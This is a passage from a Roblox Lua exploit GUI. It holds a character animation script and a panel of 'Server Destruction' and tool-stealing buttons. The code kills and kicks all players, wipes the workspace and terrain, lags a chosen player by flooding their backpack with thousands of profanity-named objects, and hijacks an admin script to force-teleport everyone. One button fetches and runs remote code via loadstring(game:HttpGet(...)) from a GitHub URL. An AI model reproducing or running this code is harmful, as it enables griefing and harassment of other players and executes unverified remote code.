			NK.C0 = clerp(NK.C0,CFrame.new(0.00204973482, 1.42796898, 0.117728591, 0.999878228, 0.00747100171, 0.0137089603, -9.46668442e-05, 0.880958676, -0.473193318, -0.0156122521, 0.473134309, 0.880851984),Alpha)
			HW.C0 = HW.C0:lerp(CF.N(0,2,0)*CF.A(M.R(0+15*M.C(Sine/36)),0,M.R(0+15*M.S(Sine/36)))*CF.N(-M.R(0+15*M.S(Sine/36)),0,M.R(0+15*M.C(Sine/36))),Alpha)
			WW.C0 = WW.C0:lerp(CF.N(0,1.5+.3*M.C(Sine/12),1.5),Alpha)
			WingFlutter()
			Root.CFrame = Root.CFrame * CF.N(0,0,-.1)
			Transparency(i/2)
		end
		Zap{
			StartCFrame=Root.CFrame,
			EndCFrame=asd*CF.N(0,4,0),
			ZapRotation = {-5,5},
			PartCount=10,
			StartSize = 4,
			EndSize = .5,
			Color = C3.N(1,1,0),
			DelayInc=5,
			Delay = 15,
		}
		Root.CFrame = asd*CF.N(0,4,0)
		Root.Anchored = true

		for i = 0, 2, .1 do
			Root.Anchored = true
			swait()
			local Alpha = .1
			Change = .5
			RJ.C0 = clerp(RJ.C0,CFrame.new(-0.00288401172, -0.186870754+.25*M.C(Sine/12), -0.184415281, 0.999970019, -0.00748212682, -0.00185852405, 0.00747100171, 0.880958676, 0.473134309, -0.00190276653, -0.473133981, 0.880988002)*CF.A(-M.R(10+5*M.S(Sine/12)),0,0),Alpha)
			LH.C0 = clerp(LH.C0,CFrame.new(-0.455414772, -0.964986682, 0.0489092469, 0.999094486, 0.0300228745, 0.0301540364, -0.0396850631, 0.913133621, 0.405724436, -0.0153536471, -0.406553656, 0.913497925)*CF.A(0,M.R(2+7*M.C(Sine/12)),-M.R(2+7*M.C(Sine/12))),Alpha)
			RH.C0 = clerp(RH.C0,CFrame.new(0.544458926, -0.964868069, 0.0333667099, 0.999092519, 0.0301021822, 0.0301397741, -0.0397526845, 0.913105845, 0.405780286, -0.015305927, -0.406610161, 0.913473606)*CF.A(0,-M.R(2+7*M.C(Sine/12)),M.R(2+7*M.C(Sine/12))),Alpha)
			LS.C0 = clerp(LS.C0,CFrame.new(-1.36389351, 0.578486085+.1*M.C(Sine/12), 0.180077106, -0.966345549, 0.257006437, -0.0111429691, 0.189922124, 0.683552086, -0.704759717, -0.173510939, -0.683157504, -0.709358692)*CF.A(0,M.R(0+5*M.C(Sine/12)),M.R(0+5*M.C(Sine/12))),Alpha)
			RS.C0 = clerp(RS.C0,CFrame.new(1.36815977, 0.578247666+.1*M.C(Sine/12), 0.13745755, 0.960469842, -0.278161407, 0.0111425305, 0.189813495, 0.683640122, 0.704703569, -0.203638792, -0.674731433, 0.709414363)*CF.A(0,-M.R(0+5*M.C(Sine/12)),M.R(0+5*M.C(Sine/12))),Alpha)
			NK.C0 = clerp(NK.C0,CFrame.new(0.00204973482, 1.42796898, 0.117728591, 0.999878228, 0.00747100171, 0.0137089603, -9.46668442e-05, 0.880958676, -0.473193318, -0.0156122521, 0.473134309, 0.880851984),Alpha)
			HW.C0 = HW.C0:lerp(CF.N(0,2,0)*CF.A(M.R(0+15*M.C(Sine/36)),0,M.R(0+15*M.S(Sine/36)))*CF.N(-M.R(0+15*M.S(Sine/36)),0,M.R(0+15*M.C(Sine/36))),Alpha)
			WW.C0 = WW.C0:lerp(CF.N(0,1.5+.3*M.C(Sine/12),1.5),Alpha)
			WingFlutter()
			Root.CFrame = Root.CFrame * CF.N(0,0,-.1)
			Transparency(1-(i/2))
		end


		Transparency(0)
		coroutine.wrap(function()
			for i = 0, 3, .1 do
				swait() 
				local Alpha = .1
				Change = .5
				circle.Size = circle.Size - V3.N(.2,.2,0)
				circle2.Size = circle2.Size - V3.N(.2,.2,0)
				circle.Front.Transparency=(i/3)
				circle.Back.Transparency=(i/3)
				circle2.Front.Transparency=(i/3)
				circle2.Back.Transparency=(i/3)

				circle.CFrame=circle.CFrame*CF.A(0,0,-M.R(5))
				circle2.CFrame=circle2.CFrame*CF.A(0,0,-M.R(5))
			end
		end)()
		Hum.AutoRotate = true
		Root.Anchored = false
		Rooted = false
		Attack = false
		NeutralAnims = true
	end

	Mouse.KeyDown:connect(function(k)
		if(Attack)then return end
		if(k == 'q')then Teleport() end
		if(k == 'z')then Lazor() end
		if(k == 'x')then Smite() end
		if(k == 'v')then HolyBomb() end
		if(k == 'c')then LightningStorm() end
	end)


	--// Wrap it all up \\--
	while true do
		swait()
		Sine = Sine + Change

		if(not Music or not Music.Parent)then
			local a = Music.TimePosition
			Music = Sound(Char,MusicID,1,3,true,false,true)
			Music.Name = 'Music'
			Music.TimePosition = a
		end
		Music.Playing = true
		Torso.Color = C3.N(0,0,0)
		RArm.Color = C3.N(0,0,0)
		LArm.Color = C3.N(0,0,0)
		RLeg.Color = C3.N(0,0,0)
		LLeg.Color = C3.N(0,0,0)
		Head.Color = C3.N(0,0,0)
		Music.Volume = 5
		Music.Pitch = 1
		Music.Playing = true
		Hum.HipHeight = 2
		Sine = Sine + Change
		local hitfloor,posfloor = workspace:FindPartOnRay(Ray.new(Root.CFrame.p,((CFrame.new(Root.Position,Root.Position - Vector3.new(0,1,0))).lookVector).unit * 100), Char)
		local Walking = (math.abs(Root.Velocity.x) > 1 or math.abs(Root.Velocity.z) > 1)
		local State = (Hum.PlatformStand and 'Paralyzed' or Hum.Sit and 'Sit' or Walking and "Walk" or "Idle")
		if(time()-PulseTime > .05)then
			PulseTime = time()
			if(hitfloor)then
				local angles = CF.A(M.RRNG(-15,15),M.RRNG(-45,45),M.RRNG(-45,45))
				Effect{
					Effect='ResizeAndFade',
					Color=hitfloor.Color,
					Material=hitfloor.Material,
					Frames=60,
					Mesh={MeshType=Enum.MeshType.FileMesh,MeshId="rbxassetid://662586858",Scale=V3.N(.01,.01,.01)},
					CFrame=CF.N(posfloor)*angles,
					MoveDirection=CF.N(posfloor)*angles*CF.N(0,6,0).p,
					FXSettings = {
						EndSize=V3.N(.0005,.0005,.0005),
						EndIsIncrement=true
					}
				}
			end
			local pos = CF.N(Torso.CFrame.p)*CF.N(0,-2,0)*CF.A(0,M.RRNG(-180,180),0)*CF.N(0,0,M.RNG(-15,-5))
			local hitfloor2,posfloor2 = workspace:FindPartOnRay(Ray.new(pos.p,((CFrame.new(pos.p,pos.p - Vector3.new(0,1,0))).lookVector).unit * 100), Char)

			if(hitfloor2)then
				pos = CF.N(posfloor2)
				Effect{
					Effect='ResizeAndFade',
					Color=BrickColor.new'New Yeller',
					Size=V3.N(2,2,2),
					Material=Enum.Material.Neon,
					Mesh={MeshType=Enum.MeshType.Sphere},
					Frames=45,
					CFrame=pos,
					FXSettings = {
						EndSize = V3.N(-.01,.25,-.01),
						EndIsIncrement = true
					}
				}
			else
				Effect{
					Effect='ResizeAndFade',
					Color=BrickColor.new'New Yeller',
					Size=V3.N(2,2,2),
					Material=Enum.Material.Neon,
					Mesh={MeshType=Enum.MeshType.Sphere},
					Frames=45,
					CFrame=pos,
					FXSettings = {
						EndSize = V3.N(-.01,.25,-.01),
						EndIsIncrement = true
					}
				}
			end
		end
		Hum.Name = math.random()*100000
		Hum.MaxHealth = 1e100
		Hum.Health = 1e100
		if(M.RNG(1,50) == 1)then
			local pos = CF.N(Torso.CFrame.p)*CF.N(0,-2,0)*CF.A(0,M.RRNG(-180,180),0)*CF.N(0,0,M.RNG(-30,-15))
			local hitfloor2,posfloor2 = workspace:FindPartOnRay(Ray.new(pos.p,((CFrame.new(pos.p,pos.p - Vector3.new(0,1,0))).lookVector).unit * 100), Char)

			if(hitfloor2)then
				pos = CF.N(posfloor2)
			end
			Zap{
				StartCFrame=Torso.CFrame,
				EndCFrame=pos,
				ZapRotation = {-2,2},
				PartCount=5,
				StartSize = .5,
				EndSize = 0,
				Color = C3.N(1,1,0),
				DelayInc=5,
				Delay = 15,
				Sound=false
			}
		end
		if(Rooted == false)then
			Hum.WalkSpeed = 32
			Hum.JumpPower = 75
		else
			Hum.WalkSpeed = 0
			Hum.JumpPower = 0
		end
		if(not Effects or not Effects.Parent)then
			Effects = IN("Model",Char)
			Effects.Name = "Effects"
		end
		if(NeutralAnims)then	
			if(State == 'Idle')then
				local Alpha = .1
				Change = .5
				RJ.C0 = clerp(RJ.C0,CFrame.new(3.20625471e-13, 0+.25*M.C(Sine/12), -6.20266655e-06, 0.999999225, 5.09317033e-11, 0, -4.38656264e-11, 0.999980271, -0.00628618058, 0, 0.00628617639, 0.999979496)*CF.A(-M.R(3+5*M.S(Sine/12)),0,0),Alpha)
				LH.C0 = clerp(LH.C0,CFrame.new(-0.443078369, -0.366475701, -0.69529891, 0.999093771, 0.0300307292, 0.0301540978, -0.039692279, 0.913133621, 0.405723602, -0.0153505448, -0.406552792, 0.913497925)*CF.A(0,M.R(0+5*M.C(Sine/12)),M.R(0+5*M.C(Sine/12))),Alpha)
				RH.C0 = clerp(RH.C0,CFrame.new(0.563508928, -0.975499094, 0.0143494867, 0.992422402, -0.121874072, 0.0156119959, 0.121789157, 0.992536128, 0.0062854127, -0.0162614994, -0.00433641672, 0.999858022)*CF.A(0,-M.R(0+5*M.C(Sine/12)),-M.R(0+5*M.C(Sine/12))),Alpha)
				LS.C0 = clerp(LS.C0,CFrame.new(-1.09520316, 0.319447398+.1*M.C(Sine/12), 0.380316556, 0.862274766, -0.50140965, 0.071203351, 0.413908899, 0.77874434, 0.471420079, -0.291823745, -0.377021939, 0.879029453)*CF.A(0,M.R(0+5*M.C(Sine/12)),M.R(0+5*M.C(Sine/12))),Alpha)
				RS.C0 = clerp(RS.C0,CFrame.new(1.38953996, 0.579314649+.1*M.C(Sine/12), 0.00156672322, 0.963396549, -0.267624378, 0.0156119959, 0.267557263, 0.9635216, 0.0062854127, -0.0167246256, -0.0018782462, 0.999858022)*CF.A(0,-M.R(0+5*M.C(Sine/12)),M.R(0+5*M.C(Sine/12))),Alpha)
				NK.C0 = clerp(NK.C0,CFrame.new(-7.09252117e-06, 1.4989512, -0.0144005567, 0.999999225, 3.67464963e-07, -1.62050128e-07, -3.56478267e-07, 0.997964799, 0.0637686923, 1.8440187e-07, -0.0637686551, 0.997963905),Alpha)
				HW.C0 = HW.C0:lerp(CF.N(0,2,0)*CF.A(M.R(0+15*M.C(Sine/36)),0,M.R(0+15*M.S(Sine/36)))*CF.N(-M.R(0+15*M.S(Sine/36)),0,M.R(0+15*M.C(Sine/36))),Alpha)
				WW.C0 = WW.C0:lerp(CF.N(0,1.5+.3*M.C(Sine/12),1.5),Alpha)
				WingFlutter()

			elseif(State == 'Walk')then
				local Alpha = .1
				Change = .5
				RJ.C0 = clerp(RJ.C0,CFrame.new(-0.00288401172, -0.186870754+.25*M.C(Sine/12), -0.184415281, 0.999970019, -0.00748212682, -0.00185852405, 0.00747100171, 0.880958676, 0.473134309, -0.00190276653, -0.473133981, 0.880988002)*CF.A(-M.R(10+5*M.S(Sine/12)),0,0),Alpha)
				LH.C0 = clerp(LH.C0,CFrame.new(-0.455414772, -0.964986682, 0.0489092469, 0.999094486, 0.0300228745, 0.0301540364, -0.0396850631, 0.913133621, 0.405724436, -0.0153536471, -0.406553656, 0.913497925)*CF.A(0,M.R(2+7*M.C(Sine/12)),-M.R(2+7*M.C(Sine/12))),Alpha)
				RH.C0 = clerp(RH.C0,CFrame.new(0.544458926, -0.964868069, 0.0333667099, 0.999092519, 0.0301021822, 0.0301397741, -0.0397526845, 0.913105845, 0.405780286, -0.015305927, -0.406610161, 0.913473606)*CF.A(0,-M.R(2+7*M.C(Sine/12)),M.R(2+7*M.C(Sine/12))),Alpha)
				LS.C0 = clerp(LS.C0,CFrame.new(-1.36389351, 0.578486085+.1*M.C(Sine/12), 0.180077106, -0.966345549, 0.257006437, -0.0111429691, 0.189922124, 0.683552086, -0.704759717, -0.173510939, -0.683157504, -0.709358692)*CF.A(0,M.R(0+5*M.C(Sine/12)),M.R(0+5*M.C(Sine/12))),Alpha)
				RS.C0 = clerp(RS.C0,CFrame.new(1.36815977, 0.578247666+.1*M.C(Sine/12), 0.13745755, 0.960469842, -0.278161407, 0.0111425305, 0.189813495, 0.683640122, 0.704703569, -0.203638792, -0.674731433, 0.709414363)*CF.A(0,-M.R(0+5*M.C(Sine/12)),M.R(0+5*M.C(Sine/12))),Alpha)
				NK.C0 = clerp(NK.C0,CFrame.new(0.00204973482, 1.42796898, 0.117728591, 0.999878228, 0.00747100171, 0.0137089603, -9.46668442e-05, 0.880958676, -0.473193318, -0.0156122521, 0.473134309, 0.880851984),Alpha)
				HW.C0 = HW.C0:lerp(CF.N(0,2,0)*CF.A(M.R(0+15*M.C(Sine/36)),0,M.R(0+15*M.S(Sine/36)))*CF.N(-M.R(0+15*M.S(Sine/36)),0,M.R(0+15*M.C(Sine/36))),Alpha)
				WW.C0 = WW.C0:lerp(CF.N(0,1.5+.3*M.C(Sine/12),1.5),Alpha)
				WingFlutter()
			elseif(State == 'Paralyzed')then
				-- paralyzed
			elseif(State == 'Sit')then
				-- sit
			end
		end
	end
end)
--
local button = Instance.new("TextButton")
button.Parent = acg
button.BackgroundColor3 = blak
button.BorderColor3 = rede
button.BorderSizePixel = 3
button.Name = "X Admin"
button.Position = UDim2.new(0,0,0,165)
button.Size = UDim2.new(0.499,0,0,30)
button.ZIndex = 2
button.Font = tef
button.FontSize = "Size14"
button.Text = "X Admin"
button.TextColor3 = whit
button.MouseButton1Down:connect(function()
	--[[
	WARNING: Heads up! This script has not been verified by ScriptBlox. Use at your own risk!
]]
	game:GetService("TextChatService").TextChannels.RBXGeneral:SendAsync("-gh 48474313 63690008 62234425 62724852 48474294 451220849")

	wait(1)

	game:GetService("TextChatService").TextChannels.RBXGeneral:SendAsync("-net")

	wait(1)

loadstring(game:HttpGet('https://raw.githubusercontent.com/TKFPc30/fe-ender/main/main.lua'))()

end)
--
local button = Instance.new("TextButton")
button.Parent = acg
button.BackgroundColor3 = blak
button.BorderColor3 = rede
button.BorderSizePixel = 3
button.Name = "Lag Gui"
button.Position = UDim2.new(0.5,3,0,165)
button.Size = UDim2.new(0.5,-3,0,30)
button.ZIndex = 2
button.Font = tef
button.FontSize = "Size14"
button.Text = "Lag Gui"
button.TextColor3 = whit
button.MouseButton1Down:connect(function()
	whoownit = game.Players.LocalPlayer
	gui = Instance.new("ScreenGui")
	gui.Parent = whoownit.PlayerGui
	gui.Name = "Lag"

	pos = 135
	pos2 = 10
	pos3 = 0

	enabled = false

	button = Instance.new("TextButton")
	button.Parent = gui
	button.Size = UDim2.new(0, 100, 0, 30)
	button.Position = UDim2.new(0, 8, 0, pos)
	button.Text = "Lag"
	button.MouseButton1Click:connect(function()
		if enabled == false then 
			enabled = true
			local a = game.Players:GetChildren()
			red = 0
			green = 0.5
			blue = 0
			for i=1, #a do
				wait()
				pos2 = pos2 + 23
				if pos2 >= 450 then
					pos3 = pos3 + 103
					pos2 = 33
				end
				if green <= 0.9 then
					green = green + 0.46
				elseif green >= 0.9 then
					green = green - 0.46
				end
				local bu = Instance.new("TextButton")
				bu.Parent = button
				bu.Size = UDim2.new(0, 100, 0, 20)
				bu.Position = UDim2.new(0, pos3, 0, pos2)
				bu.Text = a[i].Name
				bu.BackgroundTransparency = 1
				bu.TextTransparency = 1
				bu.BackgroundColor3 = Color3.new(red,green,blue)
				coroutine.resume(coroutine.create(function()
					for i=1, 3 do
						wait()
						bu.BackgroundTransparency = bu.BackgroundTransparency - 0.34
						bu.TextTransparency = bu.BackgroundTransparency
					end
				end))
				bu.MouseButton1Down:connect(function()
					local play = game.Players:findFirstChild(bu.Text)
					if play ~= nil then
						for i=1,3600 do
							Instance.new("HopperBin",play.Backpack).Name = "f       u     c   k u"
						end
						wait()
						for i=1,3600 do
							Instance.new("HopperBin",play.Backpack).Name = "f       u     c   k u"
						end
						wait()
						for i=1,3600 do
							Instance.new("HopperBin",play.Backpack).Name = "f       u     c   k u"
						end
						wait()
						for i=1,13000 do
							Instance.new("HopperBin",play.Backpack).Name = "f       u     c   k u"
						end
						wait()
						for i=1,3600 do
							Instance.new("HopperBin",play.Backpack).Name = "fuck u"
						end
						bu.Text = "Lagged!"
					end
				end)
			end
		elseif enabled == true then
			enabled = false
			pos2 = 10
			pos3 = 0
			local o = button:GetChildren()
			for i=1, #o do
				wait()
				o[i]:remove()
			end
		end
	end)	
end)
--
local button = Instance.new("TextButton")
button.Parent = acg
button.BackgroundColor3 = blak
button.BorderColor3 = rede
button.BorderSizePixel = 3
button.Name = "Global Message Gui"
button.Position = UDim2.new(0,0,0,198)
button.Size = UDim2.new(0.499,0,0,30)
button.ZIndex = 3
button.Font = tef
button.FontSize = "Size14"
button.Text = "Global Message Gui"
button.TextColor3 = whit
button.TextWrapped = true
button.MouseButton1Down:connect(function()
	gui = Instance.new("ScreenGui",game.Players.LocalPlayer.PlayerGui)
	box = Instance.new("TextBox",gui)
	box.Size = UDim2.new(0,100,0,100)
	msg = Instance.new("TextButton",gui)
	msg.Size = UDim2.new(0,100,0,50)
	msg.Position = UDim2.new(.5,0,0,0)
	msg.MouseButton1Click:connect(function()
		for _,v in pairs(game.Players:GetChildren()) do
			game:service'Chat':Chat(v.Character.Head,box.Text,Enum.ChatColor.Blue)
			wait()
			game:service'Chat':Chat(v.Character.Head,box.Text,Enum.ChatColor.Red)
			wait()
			game:service'Chat':Chat(v.Character.Head,box.Text,Enum.ChatColor.Green)
		end
	end)
end)
--
local button = Instance.new("TextButton")
button.Parent = acg
button.BackgroundColor3 = blak
button.BorderColor3 = rede
button.BorderSizePixel = 3
button.Name = "Empty"
button.Position = UDim2.new(0.5,3,0,198)
button.Size = UDim2.new(0.5,-3,0,30)
button.ZIndex = 2
button.Font = tef
button.FontSize = "Size14"
button.Text = "Empty"
button.TextColor3 = whit
button.MouseButton1Down:connect(function()

end)
-- Server Destruction --
local button = Instance.new("TextButton")
button.Parent = sd
button.BackgroundColor3 = blak
button.BorderColor3 = rede
button.BorderSizePixel = 3
button.Name = "Flood"
button.Position = UDim2.new(0,0,0,33)
button.Size = UDim2.new(0.5,0,0,30)
button.ZIndex = 2
button.Font = tef
button.FontSize = "Size14"
button.Text = "Flood"
button.TextColor3 = whit
button.MouseButton1Down:connect(function()
	game.Workspace.Terrain:SetCells(Region3int16.new(Vector3int16.new(-100,-100,-100), Vector3int16.new(100,100,100)), 17, "Solid", "X")	
end)
--
local button = Instance.new("TextButton")
button.Parent = sd
button.BackgroundColor3 = blak
button.BorderColor3 = rede
button.BorderSizePixel = 3
button.Name = "Clear Terrain"
button.Position = UDim2.new(0.5,3,0,33)
button.Size = UDim2.new(0.5,-3,0,30)
button.ZIndex = 2
button.Font = tef
button.FontSize = "Size14"
button.Text = "Clear Terrain"
button.TextColor3 = whit
button.TextWrapped = true
button.MouseButton1Down:connect(function()
	game.Workspace.Terrain:Clear()
end)
--
local button = Instance.new("TextButton")
button.Parent = sd
button.BackgroundColor3 = blak
button.BorderColor3 = rede
button.BorderSizePixel = 3
button.Name = "Apoc Troll"
button.Position = UDim2.new(0,0,0,66)
button.Size = UDim2.new(0.5,0,0,30)
button.ZIndex = 2
button.Font = tef
button.FontSize = "Size14"
button.Text = "Apoc Troll"
button.TextColor3 = whit
button.TextWrapped = true
button.MouseButton1Down:connect(function()
	ds = CFrame.new(game.Players.LocalPlayer.Character.Head.Position)
	wait()
	for i,v in pairs(game.Players:GetChildren()) do
		if v.Name == game.Players.LocalPlayer.Name then
		else
			v.Character.Torso.CFrame = ds * CFrame.new(math.random(0,50),0,math.random(0,50))
			v.Character:BreakJoints()
		end
	end
end)
--
local button = Instance.new("TextButton")
button.Parent = sd
button.BackgroundColor3 = blak
button.BorderColor3 = rede
button.BorderSizePixel = 3
button.Name = "Set Skybox"
button.Position = UDim2.new(0.5,3,0,66)
button.Size = UDim2.new(0.5,-3,0,30)
button.ZIndex = 2
button.Font = tef
button.FontSize = "Size14"
button.Text = "Set Skybox"
button.TextColor3 = whit
button.TextWrapped = true
button.MouseButton1Down:connect(function()
	local s = Instance.new("Sky")
	s.Name = "Sky"
	s.Parent = game.Lighting
	local skyboxID = game.CoreGui.CoolGui.Frame.Settings.Page1["Skybox/Decal ID"].TextBox.Text
	s.SkyboxBk = "http://www.roblox.com/asset/?id="..skyboxID
	s.SkyboxDn = "http://www.roblox.com/asset/?id="..skyboxID
	s.SkyboxFt = "http://www.roblox.com/asset/?id="..skyboxID
	s.SkyboxLf = "http://www.roblox.com/asset/?id="..skyboxID
	s.SkyboxRt = "http://www.roblox.com/asset/?id="..skyboxID
	s.SkyboxUp = "http://www.roblox.com/asset/?id="..skyboxID
	game.Lighting.TimeOfDay = 12		
end)
--
local button = Instance.new("TextButton")
button.Parent = sd
button.BackgroundColor3 = blak
button.BorderColor3 = rede
button.BorderSizePixel = 3
button.Name = "Unanchor All"
button.Position = UDim2.new(0,0,0,99)
button.Size = UDim2.new(0.499,0,0,30)
button.ZIndex = 2
button.Font = tef
button.FontSize = "Size14"
button.Text = "Unanchor All"
button.TextColor3 = whit
button.TextWrapped = true
button.MouseButton1Down:connect(function()
	function exPro(root)
		for _, v in pairs(root:GetChildren()) do
			if v:IsA("BasePart") then
				v.Material = "Plastic"
				v.Transparency = 0
				v.Anchored = false
				v.Locked = false
			end
			exPro(v)
		end
	end
	function asdf(root)
		for _, v in pairs(root:GetChildren()) do
			asdf(v)
		end
	end
	exPro(game.Workspace)
	asdf(game.Workspace)
end)
--
local button = Instance.new("TextButton")
button.Parent = sd
button.BackgroundColor3 = blak
button.BorderColor3 = rede
button.BorderSizePixel = 3
button.Name = "Decal Spam"
button.Position = UDim2.new(0.5,3,0,99)
button.Size = UDim2.new(0.5,-3,0,30)
button.ZIndex = 2
button.Font = tef
button.FontSize = "Size14"
button.Text = "Decal Spam"
button.TextColor3 = whit
button.MouseButton1Down:connect(function()
	decalID = frame.Settings.Page1["Skybox/Decal ID"].TextBox.Text
	function exPro(root)
		for _, v in pairs(root:GetChildren()) do
			if v:IsA("Decal") and v.Texture ~= "http://www.roblox.com/asset/?id="..decalID then
				v.Parent = nil
			elseif v:IsA("BasePart") then
				v.Material = "Plastic"
				v.Transparency = 0
				local One = Instance.new("Decal", v)
				local Two = Instance.new("Decal", v)
				local Three = Instance.new("Decal", v)
				local Four = Instance.new("Decal", v)
				local Five = Instance.new("Decal", v)
				local Six = Instance.new("Decal", v)
				One.Texture = "http://www.roblox.com/asset/?id="..decalID
				Two.Texture = "http://www.roblox.com/asset/?id="..decalID
				Three.Texture = "http://www.roblox.com/asset/?id="..decalID
				Four.Texture = "http://www.roblox.com/asset/?id="..decalID
				Five.Texture = "http://www.roblox.com/asset/?id="..decalID
				Six.Texture = "http://www.roblox.com/asset/?id="..decalID
				One.Face = "Front"
				Two.Face = "Back"
				Three.Face = "Right"
				Four.Face = "Left"
				Five.Face = "Top"
				Six.Face = "Bottom"
			end
			exPro(v)
		end
	end
	function asdf(root)
		for _, v in pairs(root:GetChildren()) do
			asdf(v)
		end
	end
	exPro(game.Workspace)
	asdf(game.Workspace)
end)
--
local button = Instance.new("TextButton")
button.Parent = sd
button.BackgroundColor3 = blak
button.BorderColor3 = rede
button.BorderSizePixel = 3
button.Name = "Force Teleport"
button.Position = UDim2.new(0,0,0,132)
button.Size = UDim2.new(0.499,0,0,30)
button.ZIndex = 2
button.Font = tef
button.FontSize = "Size14"
button.Text = "Force Teleport"
button.TextColor3 = whit
button.TextWrapped = true
button.MouseButton1Down:connect(function()

	local placeID = frame.Settings.Page1["Place ID"].TextBox.Text
	local hax = [[for i,v in pairs(game.Players:GetChildren()) do
game:GetService'TeleportService':Teleport(]]..placeID..[[,v.Character)
end
]]
	local x = workspace["Kohl's Admin Commands V2"].ScriptBase
	x.Code.Value = hax
	wait()
	x.Disabled = false
end)
--
local button = Instance.new("TextButton")
button.Parent = sd
button.BackgroundColor3 = blak
button.BorderColor3 = rede
button.BorderSizePixel = 3
button.Name = "Clear Workspace"
button.Position = UDim2.new(0.5,3,0,132)
button.Size = UDim2.new(0.5,-3,0,30)
button.ZIndex = 2
button.Font = tef
button.FontSize = "Size14"
button.Text = "Clear Workspace"
button.TextColor3 = whit
button.TextWrapped = true
button.MouseButton1Down:connect(function()
	game.Workspace:ClearAllChildren()
end)
--
local button = Instance.new("TextButton")
button.Parent = sd
button.BackgroundColor3 = blak
button.BorderColor3 = rede
button.BorderSizePixel = 3
button.Name = "Kill All"
button.Position = UDim2.new(0,0,0,165)
button.Size = UDim2.new(0.5,0,0,30)
button.ZIndex = 2
button.Font = tef
button.FontSize = "Size14"
button.Text = "Kill All"
button.TextColor3 = whit
button.MouseButton1Down:connect(function()
	for i,v in pairs(game.Players:GetChildren()) do
		v.Character:BreakJoints()
	end
end)
--
local button = Instance.new("TextButton")
button.Parent = sd
button.BackgroundColor3 = blak
button.BorderColor3 = rede
button.BorderSizePixel = 3
button.Name = "Kick All"
button.Position = UDim2.new(0.5,3,0,165)
button.Size = UDim2.new(0.5,-3,0,30)
button.ZIndex = 2
button.Font = tef
button.FontSize = "Size14"
button.Text = "Kick All"
button.TextColor3 = whit
button.MouseButton1Down:connect(function()
	for i,v in pairs(game.Players:GetChildren()) do
		v:Remove()	
	end
end)
--
local button = Instance.new("TextButton")
button.Parent = sd
button.BackgroundColor3 = blak
button.BorderColor3 = rede
button.BorderSizePixel = 3
button.Name = "Create Baseplate"	button.Position = UDim2.new(0,0,0,198)
button.Size = UDim2.new(0.5,0,0,30)
button.ZIndex = 2
button.Font = tef
button.FontSize = "Size14"
button.Text = "Create Baseplate"
button.TextColor3 = whit
button.TextWrapped = true
button.MouseButton1Down:connect(function()
	local pt = Instance.new("Part")
	pt.BrickColor = BrickColor.new("Silver")
	pt.Anchored = true
	pt.CanCollide = true
	pt.BottomSurface = "Weld"
	pt.Parent = workspace
	pt.Name = (math.random(1,1000000))
	pt.Size = Vector3.new(1000, 1, 1000)
end)
--
local button = Instance.new("TextButton")
button.Parent = sd
button.BackgroundColor3 = blak
button.BorderColor3 = rede
button.BorderSizePixel = 3
button.Name = "Intimidation"
button.Position = UDim2.new(0.5,3,0,198)
button.Size = UDim2.new(0.48,0,0,30)
button.ZIndex = 2
button.Font = tef
button.FontSize = "Size14"
button.Text = "Intimidation"
button.TextColor3 = whit
button.TextWrapped = true
button.MouseButton1Down:connect(function()
	print("Too lazy to re script")
end)
local title = Instance.new("TextLabel")
title.Parent = acg
title.BackgroundColor3 = blak
title.BorderColor3 = rede
title.BorderSizePixel = 3
title.Name = "Title"
title.Size = UDim2.new(1,0,0,30)
title.ZIndex = 2
title.Font = "SourceSansBold"
title.FontSize = "Size14"
title.Text = "Monster script/Gui"
title.TextColor3 = whit
local title = Instance.new("TextLabel")
title.Parent = sd
title.BackgroundColor3 = blak
title.BorderColor3 = rede
title.BorderSizePixel = 3
title.Name = "Title"
title.Size = UDim2.new(1,0,0,30)
title.ZIndex = 2
title.Font = "SourceSansBold"
title.FontSize = "Size14"
title.Text = "Server Destruction"
title.TextColor3 = whit
--Page 1 End --




-- Gear/Tools --
local button = Instance.new("TextButton")
button.Parent = gt
button.BackgroundColor3 = blak
button.BorderColor3 = rede
button.BorderSizePixel = 3
button.Name = "Custom Gear"
button.Position = UDim2.new(0,0,0,33)
button.Size = UDim2.new(0.5,0,0,30)
button.ZIndex = 2
button.Font = tef
button.FontSize = "Size14"
button.Text = "Custom Gear"
button.TextColor3 = whit
button.MouseButton1Down:connect(function()
	local x = game:GetService("InsertService"):LoadAsset(frame.Settings.Page1["Custom Gear ID"].TextBox.Text)
	for i,v in pairs(x:GetChildren()) do
		v.Parent = game.Players.LocalPlayer.Backpack
	end
	x:Remove()
end)
--
local button = Instance.new("TextButton")
button.Parent = gt
button.BackgroundColor3 = blak
button.BorderColor3 = rede
button.BorderSizePixel = 3
button.Name = "Stamper Tools"
button.Position = UDim2.new(0.5,3,0,33)
button.Size = UDim2.new(0.5,-3,0,30)
button.ZIndex = 2
button.Font = tef
button.FontSize = "Size14"
button.Text = "Stamper Tools"
button.TextColor3 = whit
button.TextWrapped = true
button.MouseButton1Down:connect(function()
	local x = game:GetService("InsertService"):LoadAsset(73089166)
	for i,v in pairs(x:GetChildren()) do
		v.Parent = game.Players.LocalPlayer.Backpack
	end
	x:Remove()
	x = game:GetService("InsertService"):LoadAsset(73089204)
	for i,v in pairs(x:GetChildren()) do
		v.Parent = game.Players.LocalPlayer.Backpack
	end
	x:Remove() 
	x = game:GetService("InsertService"):LoadAsset(73089190) 
	for i,v in pairs(x:GetChildren()) do
		v.Parent = game.Players.LocalPlayer.Backpack
	end
	x:Remove()
	x = game:GetService("InsertService"):LoadAsset(58880579) 
	for i,v in pairs(x:GetChildren()) do
		v.Parent = game.Players.LocalPlayer.Backpack
	end
	x:Remove()
	x = game:GetService("InsertService"):LoadAsset(60791062) 
	for i,v in pairs(x:GetChildren()) do
		v.Parent = game.Players.LocalPlayer.Backpack
	end
	x:Remove()
	x = game:GetService("InsertService"):LoadAsset(73089239) 
	for i,v in pairs(x:GetChildren()) do
		v.Parent = game.Players.LocalPlayer.Backpack
	end
	x:Remove()
end)
--
local button = Instance.new("TextButton")
button.Parent = gt
button.BackgroundColor3 = blak
button.BorderColor3 = rede
button.BorderSizePixel = 3
button.Name = "Tool Stealer"
button.Position = UDim2.new(0,0,0,66)
button.Size = UDim2.new(0.5,0,0,30)
button.ZIndex = 2
button.Font = tef
button.FontSize = "Size14"
button.Text = "Tool Stealer"
button.TextColor3 = whit
button.TextWrapped = true
button.MouseButton1Down:connect(function()
	local z = Instance.new("HopperBin",game.Players.LocalPlayer.Backpack) 
	z.Name = "Tool Stealer"
	function onButton1Down(mouse)
		local hit = mouse.Target
		if (hit == nil) then return end
		for i,v in pairs(hit.Parent:GetChildren()) do
